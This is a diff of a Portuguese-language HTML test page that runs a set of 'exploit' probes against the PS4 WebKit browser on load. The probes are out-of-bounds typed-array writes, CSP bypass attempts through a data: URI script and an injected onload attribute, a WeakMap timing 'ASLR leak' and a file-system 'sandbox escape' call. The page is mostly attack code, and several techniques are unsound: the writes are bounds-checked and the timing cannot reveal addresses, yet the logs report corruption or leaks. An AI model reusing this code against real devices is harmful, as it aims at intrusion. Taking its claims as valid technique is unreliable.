@@ -3,7 +3,7 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Real Exploit Test</title>
+    <title>PS4 WebKit Targeted Exploit Test</title>
     <style>
         body {
             font-family: monospace;
@@ -41,7 +41,7 @@
 </head>
 
 <body>
-    <h1>PS4 WebKit Real Exploit Test</h1>
+    <h1>PS4 WebKit Targeted Exploit Test</h1>
     <div id="output"></div>
 
     <script>
@@ -50,105 +50,187 @@
             outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
         };
 
-        async function realExploitTest() {
-            log("Iniciando Teste de Exploit Real...", 'critical');
+        async function targetedExploitTest() {
+            log("Iniciando Teste de Exploit Direcionado...", 'critical');
 
-            // ====================== 1. OOB Write com Heap Spray (Real) ======================
-            log("\n--- 1. OOB Write com Heap Spray (Real) ---", 'warning');
-            await realOOBWriteExploit();
+            // ====================== 1. OOB Write com Mapeamento Detalhado ======================
+            log("\n--- 1. OOB Write com Mapeamento Detalhado ---", 'warning');
+            await oobWriteMappingExploit();
 
-            // ====================== 2. CSP Bypass (Real) ======================
-            log("\n--- 2. CSP Bypass (Real) ---", 'warning');
-            await realCSPBypassExploit();
+            // ====================== 2. CSP Bypass com Abordagens Combinadas ======================
+            log("\n--- 2. CSP Bypass com Abordagens Combinadas ---", 'warning');
+            await cspBypassCombinedExploit();
 
-            // ====================== 3. ASLR Contorno (Tentativas Reais Limitadas) ======================
-            log("\n--- 3. ASLR Contorno (Tentativas Reais Limitadas) ---", 'warning');
-            await realASLRContorno();
+            // ====================== 3. ASLR Contorno (Focado em Vazamento) ======================
+            log("\n--- 3. ASLR Contorno (Focado em Vazamento) ---", 'warning');
+            await aslrLeakAttempt();
 
-            // ====================== 4. Sandbox Escape (Abordagens Reais Limitadas) ======================
-            log("\n--- 4. Sandbox Escape (Abordagens Reais Limitadas) ---", 'warning');
-            await realSandboxEscape();
+            // ====================== 4. Sandbox Escape (Focado em Interação de API) ======================
+            log("\n--- 4. Sandbox Escape (Focado em Interação de API) ---", 'warning');
+            await sandboxApiInteraction();
 
-            log("\nTeste de Exploit Real Concluído. Analise os logs detalhados.", 'critical');
+            log("\nTeste Direcionado Concluído. Analise os logs detalhados.", 'critical');
         }
 
-        // 1. OOB Write com Heap Spray (Real)
-        async function realOOBWriteExploit() {
-            log("\n--- OOB Write com Heap Spray (Real) ---", 'warning');
-            try {
-                const spraySize = 2048;
-                const spray = [];
-                for (let i = 0; i < spraySize; i++) {
-                    spray.push(new Uint8Array(64));
-                }
+        // 1. OOB Write com Mapeamento Detalhado
+        async function oobWriteMappingExploit() {
+            log("\n--- OOB Write com Mapeamento Detalhado ---", 'warning');
+            const bufferSize = 32; // Tamanho do buffer (ajuste conforme necessário)
+            const buffer = new ArrayBuffer(bufferSize);
+            const view = new Uint8Array(buffer);
 
-                const targetBuffer = new Uint8Array(32);
-                const writeOffset = 40;
-                const writeValue = 0x41;
+            // Offsets de escrita (baseados na análise do log anterior)
+            const writeOffsets = [-1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 8, bufferSize + 16];
+            const writeValue = 0x42; // Valor a ser escrito ('B')
 
+            // Offsets de leitura (para verificar corrupção)
+            const readOffsets = [-8, 0, bufferSize / 2, bufferSize - 1, bufferSize, bufferSize + 8];
+
+            for (const writeOffset of writeOffsets) {
                 try {
-                    targetBuffer[writeOffset] = writeValue;
-                    log(`Tentativa de OOB Write (Real): offset ${writeOffset}, valor 0x${writeValue.toString(16)}`);
-                    //  Lógica de verificação e logging detalhado (leitura de memória)
-                } catch (error) {
-                    log(`Erro no OOB Write (Real): ${error}`, 'error');
+                    view[writeOffset] = writeValue;
+                    log(`Tentativa de OOB Write (Mapeamento): offset ${writeOffset}, valor 0x${writeValue.toString(16)}`);
+
+                    // Verificação de leitura após a escrita
+                    for (const readOffset of readOffsets) {
+                        try {
+                            const readValue = view[readOffset];
+                            log(`  Leitura no offset ${readOffset}: 0x${readValue.toString(16)}`);
+                            // Análise de corrupção (adapte conforme necessário)
+                            if (readOffset !== writeOffset && readValue === writeValue) {
+                                log(`  <span class="critical">POSSÍVEL CORRUPÇÃO: Escrita em ${writeOffset} afetou leitura em ${readOffset}</span>`, 'critical');
+                            }
+                        } catch (readError) {
+                            log(`  Erro ao ler no offset ${readOffset}: ${readError}`, 'error');
+                        }
+                    }
+
+                    // Adicionar lógica para explorar corrupção de estruturas específicas
+                    // Exemplo (adapte com base em sua análise):
+                    // if (writeOffset === bufferSize) {
+                    //     try {
+                    //         // Ler um valor que você suspeita ser um ponteiro
+                    //         const potentialPtr = new DataView(buffer).getUint32(0, true);
+                    //         log(`  Potencial Ponteiro: 0x${potentialPtr.toString(16)}`);
+                    //     } catch (ptrError) {
+                    //         log(`  Erro ao ler potencial ponteiro: ${ptrError}`, 'error');
+                    //     }
+                    // }
+
+                } catch (writeError) {
+                    log(`Erro no OOB Write (Mapeamento): ${writeError}`, 'error');
                 }
 
-                spray.length = 0;
-            } catch (error) {
-                log(`Erro geral no OOB Write: ${error}`, 'error');
+                // Reset do buffer (se necessário)
+                view.fill(0);
             }
         }
 
-        // 2. CSP Bypass (Real)
-        async function realCSPBypassExploit() {
-            log("\n--- CSP Bypass (Real) ---", 'warning');
+        // 2. CSP Bypass com Abordagens Combinadas
+        async function cspBypassCombinedExploit() {
+            log("\n--- CSP Bypass com Abordagens Combinadas ---", 'warning');
+
+            // Bypass via data: URI
             try {
-                // Bypass via data: URI
                 const scriptDataURI = document.createElement('script');
-                scriptDataURI.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gQ1NQIEJ5cGFzcyEgcmVhbCEnKTs=';
-                scriptDataURI.onload = () => log("Bypass de CSP via data: URI (Real) BEM-SUCEDIDO!", 'success');
-                scriptDataURI.onerror = () => log("Falha no Bypass de CSP via data: URI (Real).", 'error');
+                scriptDataURI.src = 'data:text/javascript;base64,YWxlcnQoJ1ZQdW4gQ1NQIEJ5cGFzcyEgY29tYm8nKTs='; // alert('Vupun CSP Bypass! combo');
+                scriptDataURI.onload = () => log("Bypass de CSP via data: URI (Combo) BEM-SUCEDIDO!", 'success');
+                scriptDataURI.onerror = () => log("Falha no Bypass de CSP via data: URI (Combo).", 'error');
                 document.body.appendChild(scriptDataURI);
-
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                // Bypass via atributo onload
-                const divOnload = document.createElement('div');
-                divOnload.setAttribute('onload', 'alert(\'Vupun CSP Bypass onload real!\');');
-                document.body.appendChild(divOnload);
-                log(`Elemento div com onload injetado.`);
-
+                await new Promise(resolve => setTimeout(resolve, 500));
             } catch (error) {
-                log(`Erro ao tentar Bypass de CSP (Real): ${error}`, 'error');
+                log(`Erro no Bypass de CSP via data: URI (Combo): ${error}`, 'error');
             }
-        }
 
-        // 3. ASLR Contorno (Tentativas Reais Limitadas)
-        async function realASLRContorno() {
-            log("\n--- ASLR Contorno (Tentativas Reais Limitadas) ---", 'warning');
+            // Bypass via atributo onload (em img)
             try {
-                // Tentativa de vazamento de endereços (limitado pelo JavaScript)
-                //  Técnicas de inferência de tempo ou manipulação de objetos
-                log("Tentativas de vazamento de endereços (Real) limitadas pelo JavaScript.");
+                const imgOnload = document.createElement('img');
+                imgOnload.setAttribute('onload', 'alert(\'Vupun CSP Bypass combo onload!\');');
+                imgOnload.src = 'invalid-image.jpg'; // Forçar um "carregamento" (falha)
+                document.body.appendChild(imgOnload);
+                log(`Elemento img com onload injetado.`);
+                await new Promise(resolve => setTimeout(resolve, 500));
             } catch (error) {
-                log(`Erro ao tentar ASLR Contorno (Real): ${error}`, 'error');
+                log(`Erro no Bypass de CSP via atributo onload (Combo): ${error}`, 'error');
             }
+
+            // Adicionar outras abordagens de bypass (se aplicável e seguro)
         }
 
-        // 4. Sandbox Escape (Abordagens Reais Limitadas)
-        async function realSandboxEscape() {
-            log("\n--- Sandbox Escape (Abordagens Reais Limitadas) ---", 'warning');
+        // 3. ASLR Contorno (Focado em Vazamento)
+        async function aslrLeakAttempt() {
+            log("\n--- ASLR Contorno (Focado em Vazamento) ---", 'warning');
+
+            // Tentativa de vazar endereços usando WeakMap (se disponível)
+            if (window.WeakMap) {
+                try {
+                    const wm = new WeakMap();
+                    const obj1 = {};
+                    const obj2 = {};
+                    wm.set(obj1, new ArrayBuffer(1024));
+                    wm.set(obj2, new ArrayBuffer(1024));
+
+                    // Medir tempos de acesso (altamente instável e dependente do navegador)
+                    const start = performance.now();
+                    wm.get(obj1);
+                    const end = performance.now();
+                    const accessTime1 = end - start;
+                    log(`Tempo de acesso a obj1: ${accessTime1} ms (Inferência de ASLR)`);
+
+                    // Comparar com outro acesso
+                    const start2 = performance.now();
+                    wm.get(obj2);
+                    const end2 = performance.now();
+                    const accessTime2 = end2 - start2;
+                    log(`Tempo de acesso a obj2: ${accessTime2} ms (Inferência de ASLR)`);
+
+                    // Análise comparativa (muito imprecisa)
+                    if (accessTime1 !== accessTime2) {
+                        log("<span class='warning'>Diferença nos tempos de acesso observada. Possível vazamento de ASLR (INCONCLUSIVO).</span>", 'warning');
+                    } else {
+                        log("Tempos de acesso semelhantes. Sem indicação de vazamento de ASLR.", 'info');
+                    }
+
+                } catch (e) {
+                    log(`Erro ao tentar inferir endereços com WeakMap: ${e}`, 'error');
+                }
+            } else {
+                log("WeakMap não suportado. Vazamento de endereços limitado.", 'info');
+            }
+
+            // Adicionar outras técnicas de vazamento (se aplicável e seguro)
+        }
+
+        // 4. Sandbox Escape (Focado em Interação de API)
+        async function sandboxApiInteraction() {
+            log("\n--- Sandbox Escape (Focado em Interação de API) ---", 'warning');
+
+            // Tentar interagir com APIs do navegador de maneiras inesperadas
             try {
-                //  Tentar interagir com APIs do navegador de maneiras inesperadas
-                //  para encontrar falhas no sandbox
-                log("Tentativas de Sandbox Escape (Real) focadas em APIs do navegador.");
-            } catch (error) {
-                log(`Erro ao tentar Sandbox Escape (Real): ${error}`, 'error');
+                // Exemplo: Tentar acessar o sistema de arquivos (espera-se falha)
+                try {
+                    window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
+                    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0,
+                        function(fs) {
+                            log("Acesso ao sistema de arquivos concedido (INESPERADO)!", 'critical');
+                        },
+                        function(error) {
+                            log(`Erro ao acessar o sistema de arquivos (ESPERADO): ${error.name}`, 'info');
+                        }
+                    );
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                } catch (fileError) {
+                    log(`Erro ao acessar o sistema de arquivos: ${fileError}`, 'error');
+                }
+
+                // Adicionar outras tentativas de interagir com APIs (e.g., IndexedDB, WebSockets)
+                // para encontrar comportamentos inesperados
+            } catch (apiError) {
+                log(`Erro geral na interação com APIs: ${apiError}`, 'error');
             }
         }
 
-        document.addEventListener('DOMContentLoaded', realExploitTest);
+        document.addEventListener('DOMContentLoaded', targetedExploitTest);
     </script>
 </body>
 
